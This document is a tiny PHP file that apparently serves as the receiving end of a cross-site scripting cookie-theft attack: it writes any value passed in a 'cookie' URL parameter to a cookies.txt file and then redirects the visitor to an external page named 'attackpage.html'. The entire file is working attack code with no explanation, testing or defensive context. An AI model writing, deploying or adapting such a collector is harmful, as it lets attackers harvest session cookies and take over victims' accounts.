<?

$file = "cookies.txt";

if (isset($_GET["cookie"])) {$handle = fopen($file, 'a');fwrite($handle, "\r\n" . $_GET["cookie"]);fclose($handle);

}
 ?>
<script>window.location.replace("http://bradycoye.com/attackpage.html?done=yes");</script>
